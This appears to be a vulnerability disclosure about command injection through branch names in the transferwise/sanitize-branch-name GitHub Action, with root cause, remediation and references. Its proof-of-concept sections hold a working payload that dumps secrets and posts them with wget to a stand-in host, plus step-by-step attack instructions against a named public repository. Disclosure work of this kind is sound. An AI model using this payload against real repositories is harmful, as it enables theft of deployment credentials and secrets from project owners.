# GitHub Actions Expression Injection in transferwise/sanitize-branch-name

## Summary

A critical expression injection vulnerability in the `transferwise/sanitize-branch-name` GitHub Action allows attackers to execute arbitrary commands and exfiltrate secrets. By creating a malicious branch name containing shell metacharacters, an attacker can steal API tokens, deployment credentials, and other secrets from any repository using this action.

**Severity:** P1 - Critical
**Vulnerability Type:** Server-Side Injection > OS Command Injection
**Component:** https://github.com/transferwise/sanitize-branch-name

---

## Vulnerability Details

### Root Cause

The action directly interpolates `github.head_ref` (attacker-controlled branch name) into bash without sanitization:

**Source:** [transferwise/sanitize-branch-name/action.yml](https://github.com/transferwise/sanitize-branch-name/blob/main/action.yml)

```yaml
- name: "Determine Branch"
  shell: bash
  run: |
    BRANCH=${{ github.head_ref }}
    if [ "$BRANCH" == "" ]; then
        BRANCH=$(echo ${{ github.ref }} | sed 's/refs\/heads\///');
    fi;
```

GitHub Actions substitutes `${{ }}` expressions **before** bash execution. When an attacker creates a branch containing shell metacharacters, those characters execute as commands.

### Exploitation Requirements

1. Target repository uses `transferwise/sanitize-branch-name`
2. Workflow triggers on `pull_request` events
3. Attacker can open a PR (fork the repo)

---

## Proof of Concept

### Payload Breakdown

```
x$(env|grep${IFS}-E${IFS}"TOKEN|KEY|SECRET">/tmp/s;wget${IFS}--post-file=/tmp/s${IFS}attacker.com)y
```

| Component | Purpose |
|-----------|---------|
| `x` ... `y` | Wrapper characters (branch names must start/end with valid chars) |
| `$(...)` | Command substitution - executes enclosed commands |
| `env` | Dump all environment variables |
| `\|grep${IFS}-E${IFS}"..."` | Filter for secrets (pipe to grep with regex) |
| `${IFS}` | Internal Field Separator - replaces spaces (spaces are invalid in branch names) |
| `>/tmp/s` | Redirect output to temp file |
| `;` | Command separator |
| `wget${IFS}--post-file=/tmp/s` | POST file contents to attacker server |
| `attacker.com` | Attacker's receiver (no `http://` because colons are invalid in branch names) |

### Reproduction Steps

1. Fork any repository using `transferwise/sanitize-branch-name` with a `pull_request` trigger
2. Create a malicious branch:
   ```bash
   git checkout -b 'x$(env>/tmp/e;wget${IFS}--post-file=/tmp/e${IFS}YOUR_SERVER)y'
   ```
3. Push and open a PR to the target repository
4. The workflow executes, and secrets in the environment are sent to your server

---

## Real-World Impact

### kasikfrantisek/personal-page - Vercel Credential Theft

This public repository has Vercel deployment credentials available at the time of injection:

**Source:** [kasikfrantisek/personal-page/.github/workflows/release-preview.yml](https://github.com/kasikfrantisek/personal-page/blob/dev/.github/workflows/release-preview.yml)

```yaml
on:
  pull_request:
    branches: ["dev"]

jobs:
  vercel:
    env:
      VERCEL_TOKEN: ${{ secrets.VERCEL_TOKEN }}
      VERCEL_PROJECT_ID: ${{ secrets.VERCEL_PROJECT_ID }}
      VERCEL_ORG_ID: ${{ secrets.VERCEL_ORG_ID }}
      VERCEL_SCOPE: ${{ secrets.VERCEL_SCOPE }}
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - uses: transferwise/sanitize-branch-name@v1  # ← Secrets already in env!
```

**Attack:**
1. Fork `kasikfrantisek/personal-page`
2. Create branch: `x$(env>/tmp/e;wget${IFS}--post-file=/tmp/e${IFS}attacker.com)y`
3. Open PR to `dev` branch
4. Receive: `VERCEL_TOKEN`, `VERCEL_PROJECT_ID`, `VERCEL_ORG_ID`, `VERCEL_SCOPE`

**Impact:** Full control of victim's Vercel account - deploy malicious code to their infrastructure.

### Additional Affected Repositories

GitHub code search for `uses: transferwise/sanitize-branch-name` with `pull_request` triggers shows 30+ affected public repositories.

---

## Remediation

Replace inline expression substitution with environment variable passing:

```yaml
- name: "Determine Branch"
  shell: bash
  env:
    HEAD_REF: ${{ github.head_ref }}
    REF: ${{ github.ref }}
  run: |
    BRANCH="$HEAD_REF"
    if [ "$BRANCH" == "" ]; then
        BRANCH=$(echo "$REF" | sed 's/refs\/heads\///');
    fi;
    echo "branch_name=$BRANCH" >> $GITHUB_OUTPUT;
```

When values are passed via `env:`, bash treats them as literal strings rather than executable code.

---

## References

- [GitHub Security Lab: Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- Vulnerable action source: https://github.com/transferwise/sanitize-branch-name/blob/main/action.yml
- Affected workflow example: https://github.com/kasikfrantisek/personal-page/blob/dev/.github/workflows/release-preview.yml
